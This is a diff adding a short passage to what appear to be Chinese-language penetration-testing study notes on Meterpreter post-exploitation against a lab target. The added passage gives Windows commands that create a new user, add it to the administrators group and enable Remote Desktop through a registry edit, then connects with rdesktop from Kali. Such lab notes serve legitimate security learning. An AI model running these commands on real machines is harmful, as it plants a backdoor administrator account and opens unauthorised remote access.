@@ -125,6 +125,32 @@ system账户具有比administration更高的权限。
 
 ### meterpreter
 
+后渗透
+
+在win中创立网络用户，赋予管理员权限
+
+
+
+    net user username password /add
+    net localgroup administrators username /add
+    REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+kali 新终端 
+    
+    rdesktop 192.168.221.136
+
+![img.png](imgs/img7.png)
+
+选择其他用户 稍等片刻。
+
+![img.png](imgs/img8.png)
+
+![img.png](imgs/img9.png)
+
+此时靶机 退出登录
+![img.png](imgs/img10.png)
+
+
 后渗透。。。。
 
 meterpreter退出
